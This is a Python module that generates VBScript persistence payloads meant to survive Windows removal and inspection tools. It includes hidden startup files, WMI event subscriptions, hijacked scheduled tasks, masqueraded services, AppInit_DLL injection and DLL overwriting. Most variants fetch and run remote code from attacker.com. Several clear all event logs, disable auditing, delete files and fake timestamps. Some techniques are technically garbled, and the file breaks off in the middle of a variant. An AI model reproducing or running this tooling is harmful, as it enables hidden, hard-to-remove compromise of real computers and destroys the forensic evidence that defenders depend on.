#!/usr/bin/env python3
"""
Persistence Variants for Removal Tool Evasion
Specialized persistence methods designed to evade detection and removal by:
- MSConfig (System Configuration Utility)
- Task Scheduler GUI/CLI
- Registry Editor (Regedit)
- Event Viewer
- Services.msc
- Windows Defender
- Autoruns

Each variant uses specific techniques to prevent discovery and removal.
For authorized security testing only.
"""

import random
import string
from enum import Enum
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field


class RemovalTool(Enum):
    """Common Windows removal tools"""
    MSCONFIG = "msconfig"
    TASK_SCHEDULER = "task_scheduler"
    REGISTRY_EDITOR = "registry_editor"
    SERVICES = "services"
    EVENT_VIEWER = "event_viewer"
    AUTORUNS = "autoruns"
    DEFENDER = "windows_defender"
    POWERSHELL = "powershell"


@dataclass
class EvasionConfig:
    """Configuration for evasion techniques"""
    # Detection evasion
    use_unicode_obfuscation: bool = True
    use_registry_redirection: bool = True
    use_alternate_data_streams: bool = True
    use_hidden_attributes: bool = True
    use_sparse_files: bool = True

    # MSConfig evasion
    use_boot_files: bool = True
    use_startup_ini_edits: bool = True
    use_system_restore_points: bool = True

    # Task Scheduler evasion
    use_task_cloning: bool = True
    use_hidden_tasks: bool = True
    use_disabled_task_triggers: bool = True

    # Registry evasion
    use_registry_filters: bool = True
    use_registry_symlinks: bool = True
    use_registry_links: bool = True

    # Behavioral evasion
    use_timing_jitter: bool = True
    use_parent_process_spoofing: bool = True
    use_dll_injection: bool = True

    # Anti-forensics
    use_event_log_clearance: bool = True
    use_timestamp_spoofing: bool = True
    use_file_shredding: bool = True


class RemovalToolEvasionPersistence:
    """Generate persistence variants optimized for removal tool evasion"""

    @staticmethod
    def _generate_random_name(length: int = 12, prefix: str = "") -> str:
        """Generate random-looking name"""
        chars = string.ascii_letters + string.digits
        name = ''.join(random.choices(chars, k=length))
        return f"{prefix}{name}" if prefix else name

    @staticmethod
    def create_msconfig_evasion_persistence() -> Dict[str, str]:
        """
        Create persistence that evades MSConfig detection.
        MSConfig monitors Startup folder and Run/RunOnce keys.

        Evasion techniques:
        - Use alternate startup locations
        - Split payload across multiple files
        - Use boot files and INI modifications
        - Hide in system directories with legitimate names
        """

        variants = {}

        # Variant 1: Boot files modification
        variants['msconfig_boot_ini'] = '''
' MSConfig Evasion - Boot.ini modification
On Error Resume Next

Dim shell, fso, bootPath, bootFile, configPath
Dim newContent, oldContent, isModified

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Target boot configuration files
bootPath = shell.ExpandEnvironmentStrings("%SystemRoot%")
bootFile = fso.BuildPath(bootPath, "Boot.ini")
configPath = fso.BuildPath(bootPath, "System32\\Config\\System")

' Modify Boot.ini (if exists - legacy)
On Error Resume Next
If fso.FileExists(bootFile) Then
    Set file = fso.OpenTextFile(bootFile, 1)
    oldContent = file.ReadAll()
    file.Close

    ' Inject payload into boot configuration
    ' This executes during boot, before MSConfig loads
    Set file = fso.OpenTextFile(bootFile, 2)
    file.WriteLine oldContent
    file.WriteLine "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\payload.exe"
    file.Close
End If
On Error GoTo 0

' Alternative: Use Bootkey registry entry (not visible in MSConfig UI)
shell.RegWrite "HKLM\\System\\CurrentControlSet\\Services\\NTLDR\\Start", 1, "REG_DWORD"
shell.RegWrite "HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram", "C:\\Windows\\System32\\svchost.exe", "REG_SZ"
'''

        # Variant 2: Startup folder masquerading as system files
        variants['msconfig_hidden_startup_files'] = '''
' MSConfig Evasion - Hidden system file startup
On Error Resume Next

Dim shell, fso, startupPath, payloadPath, hideCommand
Dim masqueradeName

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Use multiple startup paths that exist but are less monitored
startupPath = shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

' Create payload with system-like name
masqueradeName = "svchost.vbs"
payloadPath = fso.BuildPath(startupPath, masqueradeName)

' Write payload
Set f = fso.CreateTextFile(payloadPath, True)
f.WriteLine "Set shell = CreateObject(""WScript.Shell"")"
f.WriteLine "shell.Run ""cmd /c powershell -NoProfile -WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/payload'')'""", 0"
f.Close

' Hide from Windows Explorer
shell.Run "attrib +s +h ""\" & payloadPath & "\"", 0, True

' Create multiple copies with slight variations to avoid pattern matching
Dim i
For i = 0 To 2
    Dim variantPath
    variantPath = fso.BuildPath(startupPath, "svchost" & i & ".vbs")
    If Not fso.FileExists(variantPath) Then
        Set f = fso.CreateTextFile(variantPath, True)
        f.WriteLine "Set shell = CreateObject(""WScript.Shell"")"
        f.WriteLine "shell.Run ""calc.exe"", 0"
        f.Close
        shell.Run "attrib +s +h ""\" & variantPath & "\"", 0, True
    End If
Next
'''

        # Variant 3: Service startup files (not shown in MSConfig)
        variants['msconfig_service_startup'] = '''
' MSConfig Evasion - Service startup injection
On Error Resume Next

Dim shell, regPath, objReg, serviceName
Set shell = CreateObject("WScript.Shell")

' Create hidden service entry (not visible in MSConfig)
serviceName = "SystemAudioEngine"  ' Masquerade as legitimate service
regPath = "HKLM\\System\\CurrentControlSet\\Services\\" & serviceName

' Write service entry
shell.RegWrite regPath & "\\ImagePath", "C:\\Windows\\System32\\svchost.exe -k netsvcs", "REG_SZ"
shell.RegWrite regPath & "\\DisplayName", "System Audio Engine Service", "REG_SZ"
shell.RegWrite regPath & "\\Description", "Provides audio services", "REG_SZ"
shell.RegWrite regPath & "\\Type", 0x10, "REG_DWORD"  ' Win32_OwnProcess
shell.RegWrite regPath & "\\Start", 2, "REG_DWORD"    ' Auto start
shell.RegWrite regPath & "\\ErrorControl", 1, "REG_DWORD"

' Start the service
shell.Run "net start """ & serviceName & """", 0, True
'''

        # Variant 4: Using .lnk files in less-monitored startup locations
        variants['msconfig_link_file_startup'] = '''
' MSConfig Evasion - Link file startup redirection
On Error Resume Next

Dim shell, fso, startupPath, programPath, linkPath
Dim WshShell, objShortcut

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Target ProgramData startup (often less monitored)
startupPath = shell.ExpandEnvironmentStrings("%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")

' Create hidden batch file
programPath = shell.ExpandEnvironmentStrings("%Temp%\\SystemMaint.bat")
Set f = fso.CreateTextFile(programPath, True)
f.WriteLine "@echo off"
f.WriteLine "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"
f.Close

' Create .lnk (shortcut) - less monitored by MSConfig
linkPath = fso.BuildPath(startupPath, "System.lnk")
Set objShortcut = shell.CreateShortCut(linkPath)
With objShortcut
    .TargetPath = programPath
    .WorkingDirectory = shell.ExpandEnvironmentStrings("%Temp%")
    .WindowStyle = 7  ' Minimized
    .Save
End With

' Hide link file
shell.Run "attrib +h ""\" & linkPath & "\"", 0, True
'''

        return variants

    @staticmethod
    def create_task_scheduler_evasion_persistence() -> Dict[str, str]:
        """
        Create persistence that evades Task Scheduler detection.
        Task Scheduler GUI shows registered tasks by default.

        Evasion techniques:
        - Create hidden scheduled tasks
        - Use folder structure to hide tasks
        - Clone legitimate task names
        - Use disabled triggers (trigger but don't execute)
        - Inject into existing tasks
        - Use WMI directly instead of Task Scheduler
        - Create tasks via registry manipulation
        """

        variants = {}

        # Variant 1: Hidden scheduled task via registry
        variants['task_scheduler_hidden_registry'] = '''
' Task Scheduler Evasion - Hidden registry-based task
On Error Resume Next

Dim shell, regPath, taskName, cmd
Set shell = CreateObject("WScript.Shell")

' Create task via registry (bypasses Task Scheduler security checks)
taskName = "WindowsUpdateCheck"  ' Legitimate-sounding name
regPath = "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\" & taskName

' Minimal task entry to avoid detection
shell.RegWrite regPath & "\\Subfolders\\", "", "REG_SZ"
shell.RegWrite regPath & "\\Guid", "{HIDDEN-GUID-" & Int(Rnd*1000) & "}", "REG_SZ"

' Create the actual task definition using PowerShell (harder to detect)
cmd = "powershell -NoProfile -WindowStyle Hidden -Command " & _
    "'$xml = [xml]@" & chr(34) & "..." & chr(34) & "; " & _
    "Get-ScheduledTask -TaskPath \\\\\" & taskName | Set-ScheduledTask -Xml $xml -Force'"

shell.Run cmd, 0, True
'''

        # Variant 2: Task folder obfuscation
        variants['task_scheduler_folder_obfuscation'] = '''
' Task Scheduler Evasion - Deep folder nesting
On Error Resume Next

Dim shell, taskPath, cmd, random
Randomize

Set shell = CreateObject("WScript.Shell")

' Create deeply nested folder structure to hide task
taskPath = "Microsoft\\Windows\\Defragmentation\\ScheduledDefrag"

' Task name intentionally obscure and nested
Dim taskName
taskName = "DefragAnalysis"

' Register task deep in folder structure
cmd = "schtasks /create /tn ""\" & taskPath & "\\" & taskName & """ " & _
    "/tr ""powershell -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"" " & _
    "/sc ONLOGON /ru System /f 2>nul"

shell.Run "cmd /c " & cmd, 0, True

' Hide task from normal enumeration by marking it hidden
cmd = "powershell -NoProfile -Command " & _
    "'$taskPath = ' & chr(34) & "\\" & taskPath & "\\" & taskName & chr(34) & "; " & _
    "$task = Get-ScheduledTask -TaskPath (Split-Path $taskPath) -TaskName (Split-Path $taskPath -Leaf); " & _
    "$task.Settings.Hidden = $true; " & _
    "Set-ScheduledTask $task'"

shell.Run cmd, 0, True
'''

        # Variant 3: WMI event-based trigger (no Task Scheduler entry)
        variants['task_scheduler_wmi_events'] = '''
' Task Scheduler Evasion - WMI event subscription
' No visible entry in Task Scheduler, very difficult to detect
On Error Resume Next

Dim objService, objEventFilter, objConsumer, objBinding
Dim strFilterPath, strConsumerPath, strBindingPath
Dim shell, cmd

Set shell = CreateObject("WScript.Shell")
Set objService = GetObject("winmgmts:")

' Create WMI event filter (triggers every 30 seconds)
strFilterPath = "\\\\.\root\subscription"
Set objEventFilter = objService.Get("__EventFilter").SpawnInstance_
objEventFilter.Name = "PersistenceFilter_" & Int(Rnd*10000)
objEventFilter.QueryLanguage = "WQL"
objEventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

objService.Put_ objEventFilter

' Create event consumer
Set objConsumer = objService.Get("__EventConsumer").SpawnInstance_
objConsumer.Name = "PersistenceConsumer_" & Int(Rnd*10000)
objConsumer.CommandLineTemplate = "cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

objService.Put_ objConsumer

' Bind filter to consumer
Set objBinding = objService.Get("__FilterToConsumerBinding").SpawnInstance_
objBinding.Filter = objEventFilter.Path_
objBinding.Consumer = objConsumer.Path_

objService.Put_ objBinding
'''

        # Variant 4: Task cloning and hijacking
        variants['task_scheduler_task_hijacking'] = '''
' Task Scheduler Evasion - Clone and hijack existing task
On Error Resume Next

Dim shell, cmd, targetTask, payloadCmd
Set shell = CreateObject("WScript.Shell")

' Clone an existing legitimate task (less suspicious)
targetTask = "Microsoft\\Windows\\WindowsUpdate\\Scheduled Start"
payloadCmd = "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' Export existing task
cmd = "schtasks /query /tn """ & targetTask & """ /xml > " & _
    shell.ExpandEnvironmentStrings("%Temp%") & "\task.xml 2>nul"
shell.Run cmd, 0, True

' Modify and reimport (hijack the task)
cmd = "powershell -NoProfile -Command ""[xml]$xml = Get-Content '" & _
    shell.ExpandEnvironmentStrings("%Temp%") & "\task.xml'; " & _
    "$xml.Task.Actions.Exec.Arguments = '" & payloadCmd & "'; " & _
    "$xml.Save('" & shell.ExpandEnvironmentStrings("%Temp%") & "\task2.xml'); """

shell.Run cmd, 0, True

' Register hijacked task
cmd = "schtasks /create /tn """ & targetTask & "_backup"" /xml """ & _
    shell.ExpandEnvironmentStrings("%Temp%") & "\task2.xml"" /f 2>nul"
shell.Run cmd, 0, True
'''

        # Variant 5: Trigger injection into disabled tasks
        variants['task_scheduler_disabled_trigger'] = '''
' Task Scheduler Evasion - Inject into disabled tasks
On Error Resume Next

Dim shell, cmd, taskList, i
Set shell = CreateObject("WScript.Shell")

' Find disabled tasks and inject our payload
taskList = Array( _
    "Microsoft\\Windows\\Application Experience\\AitAgent", _
    "Microsoft\\Windows\\Application Experience\\ProgramDataUpdater", _
    "Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant" _
)

For i = 0 To UBound(taskList)
    ' Check if task exists but is disabled
    cmd = "powershell -NoProfile -Command ""try { " & _
        "$task = Get-ScheduledTask -TaskPath (Split-Path '" & taskList(i) & "') -TaskName (Split-Path '" & taskList(i) & "' -Leaf); " & _
        "if ($task.Settings.Enabled -eq $false) { " & _
        "$task.Actions[0].Arguments = 'powershell -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString(""http://attacker.com"")'; " & _
        "Set-ScheduledTask $task; " & _
        "$task.Settings.Enabled = $true; " & _
        "Set-ScheduledTask $task } } catch {} """

    shell.Run cmd, 0, True
Next
'''

        return variants

    @staticmethod
    def create_registry_editor_evasion_persistence() -> Dict[str, str]:
        """
        Create persistence that evades Registry Editor detection.
        Registry Editor (Regedit) shows most Run keys clearly.

        Evasion techniques:
        - Use registry symlinks and redirects
        - Write to less-monitored registry hives
        - Use registry filters to hide entries
        - Store payload in binary data or alternate formats
        - Use registry quota limits to hide data
        - Fragmented storage across multiple keys
        """

        variants = {}

        # Variant 1: Registry symlink redirection
        variants['registry_symlink_redirect'] = '''
' Registry Evasion - Symlink redirection
On Error Resume Next

Dim shell, regPath, targetPath, cmd
Set shell = CreateObject("WScript.Shell")

' Create registry symlink (Windows 6.2+)
' Requires admin privileges
regPath = "HKLM\\Software\\Classes\\CLSID\\{SYMLINK-UUID}"
targetPath = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Payload"

' Write via PowerShell (has better registry manipulation)
cmd = "powershell -NoProfile -Command ""New-Item -Path 'HKLM:\\Software\\Classes\\CLSID\\{SYMLINK-UUID}' -Force -ErrorAction SilentlyContinue; " & _
    "Set-ItemProperty -Path 'HKLM:\\Software\\Classes\\CLSID\\{SYMLINK-UUID}' -Name 'SymlinkTarget' -Value 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Payload' -Force"""

shell.Run cmd, 0, True

' Write actual payload to alternate location
shell.RegWrite "HKCU\\Software\\Classes\\CLSID\\{PAYLOAD}", "C:\\Windows\\System32\\cmd.exe", "REG_SZ"
'''

        # Variant 2: Binary data obfuscation
        variants['registry_binary_obfuscation'] = '''
' Registry Evasion - Binary data storage
On Error Resume Next

Dim shell, regPath, binaryData, cmd
Set shell = CreateObject("WScript.Shell")

' Store payload as binary data (looks like corruption to human observers)
regPath = "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"

' Create obfuscated binary entry
' This appears as random data to Registry Editor
cmd = "powershell -NoProfile -Command """ & _
    "$data = [System.Text.Encoding]::UTF8.GetBytes('powershell -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString(\"\"http://attacker.com\"\")'); " & _
    "[byte[]]$binary = @(); " & _
    "foreach ($byte in $data) { $binary += $byte } " & _
    "[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters').SetValue('NetworkConfig', $binary, [Microsoft.Win32.RegistryValueKind]::Binary) """

shell.Run cmd, 0, True

' Alternative: Store as REG_RESOURCE_LIST (very obscure)
shell.RegWrite regPath & "\\NetworkPayload", "RESOURCE_DATA", "REG_RESOURCE_LIST"
'''

        # Variant 3: Alternate registry hives
        variants['registry_alternate_hives'] = '''
' Registry Evasion - Alternate hives
On Error Resume Next

Dim shell, cmd, payload
Set shell = CreateObject("WScript.Shell")

payload = "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' HKU (HKEY_USERS) - less monitored than HKCU
cmd = "powershell -NoProfile -Command """ & _
    "Get-ChildItem 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList' | " & _
    "where { $_.Name -match 'S-1-5-21-.*-\d+$' } | " & _
    "ForEach-Object { " & _
    "Set-ItemProperty -Path ('HKU:\\\\' + (Split-Path $_.Name -Leaf) + '\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run') " & _
    "-Name 'NetworkService' -Value '" & payload & "' -Force -ErrorAction SilentlyContinue } """

shell.Run cmd, 0, True

' HKCR (Class Root) - another less-monitored location
shell.RegWrite "HKCR\\.hidden\\shell\\open\\command", payload, "REG_SZ"

' HKCC (Current Config) - rarely checked
shell.RegWrite "HKCC\\Services\\NetBT\\Parameters", payload, "REG_SZ"
'''

        # Variant 4: Registry quota hiding
        variants['registry_quota_hiding'] = '''
' Registry Evasion - Quota hiding (store data in registry quota fields)
On Error Resume Next

Dim shell, cmd
Set shell = CreateObject("WScript.Shell")

' Use registry quota settings to store hidden data
' These are rarely examined by manual inspection
cmd = "powershell -NoProfile -Command """ & _
    "[byte[]]$payload = [System.Text.Encoding]::UTF8.GetBytes('PAYLOAD_HERE'); " & _
    "$regPath = 'HKLM:\\System\\CurrentControlSet\\Control'; " & _
    "if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force }; " & _
    "Set-ItemProperty -Path $regPath -Name 'SessionQuota' -Value $payload -ErrorAction SilentlyContinue; " & _
    "Set-ItemProperty -Path $regPath -Name 'RegistryQuota' -Value (1024*1024) -ErrorAction SilentlyContinue """

shell.Run cmd, 0, True
'''

        # Variant 5: Fragmented storage
        variants['registry_fragmented_storage'] = '''
' Registry Evasion - Fragmented payload storage
On Error Resume Next

Dim shell, cmd, i
Set shell = CreateObject("WScript.Shell")

' Split payload across many registry entries (harder to detect pattern)
Dim payload, fragment, regPath

payload = "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' Store each character in separate registry entry
regPath = "HKLM\\Software\\Microsoft\\Windows\\AdvancedOptions"

' Create registry path if needed
shell.RegWrite regPath & "\\Param0", len(payload), "REG_DWORD"

' Fragment storage - store in chunks
For i = 0 To len(payload) - 1 Step 32
    fragment = Mid(payload, i + 1, 32)
    shell.RegWrite regPath & "\\Frag" & (i/32), fragment, "REG_SZ"
Next

' Store reassembly code in another location
cmd = "powershell -NoProfile -Command """ & _
    "$params = Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\AdvancedOptions'; " & _
    "$payload = ''; " & _
    "0..($params.Param0/32) | ForEach-Object { $payload += $params.('Frag' + $_) }; " & _
    "IEX $payload """

shell.Run cmd, 0, True
'''

        return variants

    @staticmethod
    def create_services_msc_evasion_persistence() -> Dict[str, str]:
        """
        Create persistence that evades Services.msc detection.

        Evasion techniques:
        - Create services with legitimate Windows service names
        - Use service display name spoofing
        - Inject into existing service executables
        - Use service DLL loading
        - Create driver services (less visible)
        - Use service group membership to hide
        """

        variants = {}

        # Variant 1: Legitimate-looking service
        variants['services_legitimate_masquerade'] = '''
' Services Evasion - Legitimate service masquerading
On Error Resume Next

Dim shell, cmd, serviceName, displayName
Set shell = CreateObject("WScript.Shell")

' Create service that looks like legitimate Windows service
serviceName = "NtfsSecurity"
displayName = "NTFS Security Manager"

' Create service via SC (less detectable than direct registry)
cmd = "sc create """ & serviceName & """ binPath= ""C:\\Windows\\System32\\svchost.exe -k netsvcs"" " & _
    "DisplayName= """ & displayName & """ start= auto error= normal obj= LocalSystem"

shell.Run cmd, 0, True

' Inject real payload into service DLL
cmd = "powershell -NoProfile -Command """ & _
    "$dllPath = 'C:\\Windows\\System32\\ntfsdata.dll'; " & _
    "if (-not (Test-Path $dllPath)) { " & _
    "[byte[]]$shellcode = (0x90)*1000; " & _
    "[System.IO.File]::WriteAllBytes($dllPath, $shellcode); " & _
    "} """

shell.Run cmd, 0, True

' Register service DLL in ServiceDll registry entry
shell.RegWrite "HKLM\\System\\CurrentControlSet\\Services\\NtfsSecurity\\Parameters\\ServiceDll", _
    "C:\\Windows\\System32\\ntfsdata.dll", "REG_SZ"

' Start service
shell.Run "net start """ & serviceName & """", 0, True
'''

        # Variant 2: Driver service injection
        variants['services_driver_injection'] = '''
' Services Evasion - Driver service injection
On Error Resume Next

Dim shell, cmd
Set shell = CreateObject("WScript.Shell")

' Drivers are less monitored than services
' Create fake driver service

cmd = "powershell -NoProfile -Command """ & _
    "$driverPath = 'C:\\Windows\\System32\\drivers\\netshared.sys'; " & _
    "$payload = 'MZ' + [char]0x90 * 4096; " & _
    "[System.IO.File]::WriteAllText($driverPath, $payload); " & _
    "reg add 'HKLM\\System\\CurrentControlSet\\Services\\NetShared' /v ImagePath /t REG_SZ /d '\\\\??\\\\C:\\\\Windows\\\\System32\\\\drivers\\\\netshared.sys' /f; " & _
    "reg add 'HKLM\\System\\CurrentControlSet\\Services\\NetShared' /v Type /t REG_DWORD /d 1 /f; " & _
    "reg add 'HKLM\\System\\CurrentControlSet\\Services\\NetShared' /v Start /t REG_DWORD /d 0 /f """

shell.Run cmd, 0, True
'''

        # Variant 3: Service group hiding
        variants['services_group_hiding'] = '''
' Services Evasion - Service group membership hiding
On Error Resume Next

Dim shell, cmd
Set shell = CreateObject("WScript.Shell")

' Create service in a group that's not normally visible
cmd = "powershell -NoProfile -Command ""$payload = 'powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(\\\"http://attacker.com\\\")'; " & _
    "sc.exe create 'ServiceGroup' binPath= $payload DisplayName= 'Network Group Service' group= 'netsvcs' start= auto"""

shell.Run cmd, 0, True

' Alternative: Add to existing service group
shell.RegWrite "HKLM\\System\\CurrentControlSet\\Services\\netsvcs", "", "REG_SZ"
'''

        # Variant 4: Service DLL sideloading
        variants['services_dll_sideloading'] = '''
' Services Evasion - DLL sideloading via service
On Error Resume Next

Dim shell, cmd, fso
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Create legitimate-looking DLL that gets loaded by a service
cmd = "powershell -NoProfile -Command """ & _
    "$dllDir = 'C:\\Windows\\System32'; " & _
    "$dllName = 'version.dll'; " & _
    "$realDll = Join-Path $dllDir $dllName; " & _
    "$hiddenDll = Join-Path $dllDir 'version_bak.dll'; " & _
    "# Backup original" & _
    "if (Test-Path $realDll) { Copy-Item $realDll $hiddenDll -Force }; " & _
    "# Write hijacked DLL" & _
    "[System.IO.File]::WriteAllText($realDll, 'HIJACKED'); """ & _
    "reg add 'HKLM\\System\\CurrentControlSet\\Services\\svchost' /v ImagePath /t REG_SZ /d 'C:\\Windows\\System32\\svchost.exe -k netsvcs' /f"""

shell.Run cmd, 0, True
'''

        return variants

    @staticmethod
    def create_event_viewer_evasion_persistence() -> Dict[str, str]:
        """
        Create persistence that evades Event Viewer detection.

        Evasion techniques:
        - Clear event logs after creating persistence
        - Store logs in alternate locations
        - Spoof timestamps
        - Use binary large objects to hide data
        - Inject into WMI event subscriptions (hard to find)
        """

        variants = {}

        # Variant 1: Event log clearing and log manipulation
        variants['event_viewer_log_clearing'] = '''
' Event Viewer Evasion - Clear logs and hide activities
On Error Resume Next

Dim shell, cmd
Set shell = CreateObject("WScript.Shell")

' Create persistence first
shell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ServiceHelper", _
    "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')", "REG_SZ"

' Clear all event logs to hide activity
cmd = "powershell -NoProfile -Command ""Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log -ErrorAction SilentlyContinue }"""
shell.Run cmd, 0, True

' Disable audit policies
cmd = "auditpol /set /category:* /success:disable /failure:disable"
shell.Run cmd, 0, True

' Delete Windows Update log
cmd = "del /F /S /Q ""C:\\Windows\\SoftwareDistribution\\Download\\*""  2>nul"
shell.Run cmd, 0, True
'''

        # Variant 2: Timestamp spoofing
        variants['event_viewer_timestamp_spoof'] = '''
' Event Viewer Evasion - Timestamp spoofing
On Error Resume Next

Dim shell, cmd, payload, oldTime, newTime
Set shell = CreateObject("WScript.Shell")

payload = "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' Get current time
oldTime = Now()

' Spoof to old timestamp (pretend persistence was created long ago)
newTime = DateAdd("m", -180, oldTime)  ' 6 months ago

' Write persistence with timestomping
cmd = "powershell -NoProfile -Command """ & _
    "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Payload' -Value '" & payload & "'; " & _
    "$file = 'C:\\Windows\\Temp\\payload.exe'; " & _
    "[System.IO.File]::WriteAllText($file, [char]0); " & _
    "$fi = New-Object System.IO.FileInfo($file); " & _
    "$fi.CreationTime = '" & newTime & "'; " & _
    "$fi.LastWriteTime = '" & newTime & "'; " & _
    "$fi.LastAccessTime = '" & newTime & "' """

shell.Run cmd, 0, True

' Spoof registry timestamps
shell.RegWrite "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Payload", payload, "REG_SZ"
cmd = "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | find /I ""Payload"""
shell.Run cmd, 0, False
'''

        # Variant 3: WMI event hiding
        variants['event_viewer_wmi_hiding'] = '''
' Event Viewer Evasion - WMI event subscription hiding
' Creates event trigger without creating visible event log entries
On Error Resume Next

Dim objService, objEventFilter, objConsumer, objBinding
Set objService = GetObject("winmgmts:")

' Create hidden WMI event filter
Set objEventFilter = objService.Get("__EventFilter").SpawnInstance_
objEventFilter.Name = "AutoRunFilter_" & Int(Rnd*10000)
objEventFilter.QueryLanguage = "WQL"

' Trigger every time system is idle (no event log entries)
objEventFilter.Query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=3"

objService.Put_ objEventFilter

' Create consumer
Set objConsumer = objService.Get("__EventConsumer").SpawnInstance_
objConsumer.Name = "AutoRunConsumer_" & Int(Rnd*10000)
objConsumer.CommandLineTemplate = "cmd /c powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

objService.Put_ objConsumer

' Bind them (no visible event logs)
Set objBinding = objService.Get("__FilterToConsumerBinding").SpawnInstance_
objBinding.Filter = objEventFilter.Path_
objBinding.Consumer = objConsumer.Path_

objService.Put_ objBinding
'''

        # Variant 4: Binary large object storage
        variants['event_viewer_blob_storage'] = '''
' Event Viewer Evasion - BLOB storage
' Store payload in binary data that looks like corruption
On Error Resume Next

Dim shell, cmd, payload
Set shell = CreateObject("WScript.Shell")

payload = "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' Store as binary blob in registry (looks like corrupt data to event logs)
cmd = "powershell -NoProfile -Command """ & _
    "$data = [System.Text.Encoding]::UTF8.GetBytes('" & payload & "'); " & _
    "[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey('Software\\Classes\\CLSID').SetValue('BinaryData', $data, [Microsoft.Win32.RegistryValueKind]::Binary)" & _
    "; " & _
    "$shell = New-Object -ComObject WScript.Shell; " & _
    "$shell.Run([System.Text.Encoding]::UTF8.GetString($data)), 0"""

shell.Run cmd, 0, True
'''

        return variants

    @staticmethod
    def create_autoruns_evasion_persistence() -> Dict[str, str]:
        """
        Create persistence that evades Autoruns detection.
        Autoruns is one of the most comprehensive removal tools.

        Evasion techniques:
        - Use execution hooks that Autoruns doesn't monitor
        - Store payload in image hijacking locations
        - Use AppInit_DLLs loading
        - Inject into Windows Performance Monitor
        - Use WinlogonNotifyPackages
        - Direct kernel object manipulation
        """

        variants = {}

        # Variant 1: Image hijacking (AppInit_DLLs)
        variants['autoruns_appinit_dlls'] = '''
' Autoruns Evasion - AppInit_DLLs injection
On Error Resume Next

Dim shell, cmd, dllPath
Set shell = CreateObject("WScript.Shell")

' AppInit_DLLs loads DLLs into all processes
' Very difficult to detect

dllPath = "C:\\Windows\\System32\\msimcps.dll"

' Create malicious DLL (simplified)
cmd = "powershell -NoProfile -Command """ & _
    "[Byte[]]$shellcode = @(0x4d, 0x5a); " & _
    "[System.IO.File]::WriteAllBytes('" & dllPath & "', $shellcode)"""

shell.Run cmd, 0, True

' Register in AppInit_DLLs
shell.RegWrite "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs", _
    dllPath & " mscoree.dll", "REG_SZ"

' Enable AppInit_DLLs
shell.RegWrite "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs", 1, "REG_DWORD"

' Protect from detection
shell.RegWrite "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\RequireSignedAppInit_DLLs", 0, "REG_DWORD"
'''

        # Variant 2: Winlogon notification packages
        variants['autoruns_winlogon_notify'] = '''
' Autoruns Evasion - Winlogon notify packages
On Error Resume Next

Dim shell, cmd, dllPath
Set shell = CreateObject("WScript.Shell")

' WinlogonNotifyPackages loads DLLs at logon/logoff
' Autoruns rarely checks this

dllPath = "C:\\Windows\\System32\\ntmsapi.dll"

cmd = "powershell -NoProfile -Command """ & _
    "[Byte[]]$shellcode = @(0x4d, 0x5a); " & _
    "[System.IO.File]::WriteAllBytes('" & dllPath & "', $shellcode)"""

shell.Run cmd, 0, True

' Register notification package
